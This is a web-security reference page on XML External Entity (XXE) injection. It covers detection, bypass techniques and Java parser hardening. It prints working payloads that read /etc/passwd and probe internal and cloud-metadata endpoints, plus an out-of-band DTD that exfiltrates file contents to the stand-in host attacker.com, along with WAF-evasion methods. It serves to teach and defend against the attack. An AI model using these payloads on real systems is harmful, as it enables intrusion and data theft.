# Web Security - XXE (XML External Entity Injection)

> Source: WooYun vulnerability database | split from web-injection.md

## 4. XXE (XML External Entity Injection)

### 4.1 Nature of the Vulnerability

```
XML input -> the parser enables DTD/external entities -> the entity reference is resolved -> file read/SSRF/RCE
```

**Core formula**: XXE = XML parser allows external-entity references + user-controllable XML input

### 4.2 Detection Methods

**Identifying high-risk entry points**

| Entry type | Detection trait | Typical scenario |
|----------|----------|----------|
| API endpoint | Content-Type contains `text/xml` or `application/xml` | RESTful API, SOAP web service |
| File upload | SVG images, DOCX/XLSX/PPTX (ZIP containing XML) | Avatar upload, document import |
| Data parsing | XML-config import, RSS/Atom feeds | Backend admin, aggregation features |
| Protocol interaction | SAML auth, WebDAV, XMPP | SSO login, file management |

**Quick-detection workflow**

```
1. Identify XML-processing endpoints -> test by setting Content-Type to application/xml
2. Send a basic DTD declaration -> observe whether it parses (error difference)
3. Try an external-entity reference -> read a known file via the file protocol
4. When there is no echo -> OOB exfiltration (DNS/HTTP callback)
```

### 4.3 Classic Payloads

#### File Read (with echo)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRF Internal-Network Probing

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### Blind Injection - OOB Data Exfiltration

```xml
<!-- external DTD (evil.dtd hosted on the attacker server) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtd content: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### Error-Message Echo

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 Bypass Techniques

| Bypass | Method | Applicable scenario |
|----------|------|----------|
| Encoding bypass | UTF-16BE/LE, UTF-7-encoded XML | WAF matches ASCII patterns |
| Parameter-entity nesting | `%entity;` instead of `&entity;` | When general entity `&` is filtered |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | When you cannot control the DOCTYPE declaration |
| SVG embedding | XXE entity embedded in an SVG file | Only image upload allowed |
| DOCX/XLSX embedding | Modify `[Content_Types].xml` inside the Office doc | Document-upload features |
| CDATA wrapping | Use a CDATA section to bypass special-char limits | Read files containing XML special chars |

### 4.5 Defenses

```java
// Java: disable DTD and external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- Disable DTD processing and external-entity resolution (preferred)
- Use JSON instead of XML for data exchange
- Allowlist-validate input; upgrade the XML-parsing library
- A WAF rule blocking the `<!DOCTYPE`/`<!ENTITY`/`SYSTEM` keywords

---

